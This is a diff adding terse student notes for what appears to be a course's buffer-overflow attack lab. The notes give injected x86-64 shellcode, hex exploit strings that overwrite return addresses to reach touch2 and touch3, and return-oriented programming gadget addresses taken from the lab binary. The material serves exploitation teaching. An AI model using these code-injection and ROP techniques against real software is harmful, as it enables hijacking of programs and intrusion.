@@ -1,0 +1,51 @@
+2
+
+mov $0x59b997fa, %rdi
+push $0x4017ec
+retq
+
+Cookie: 0x59b997fa
+
+rsp:0x5561dc78 -> + 28
+
+touch2:0x4017ec
+touch3:0x4018fa
+
+
+3
+
+string : 35 39 62 39 39 37 66 61 00 48 c7 c7 78 dc 61 55 68 fa 18 40 00 c3
+
+
+final string : 35 39 62 39 39 37 66 61 00 48 c7 c7 78 dc 61 55 48 83 ec 50 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 81 dc 61 55 00 00 00 00
+
+
+code start address: 0x5561dc81
+
+
+mov $0x5561dc78, %rdi
+sub $28, %rsp
+push $0x4018fa
+retq
+
+
+4
+
+
+58 90 : pop %rax
+  -> 00000000004019ca <getval_280>:
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3
+
+  0x4019cc
+
+
+48 89 c7: mov %rax, %rdi
+  -> 00000000004019a0 <addval_273>:
+    4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+    4019a6:	c3                   	retq
+
+    0x4019a2
+
+
+    mov %rsp, %rax   0x401a06
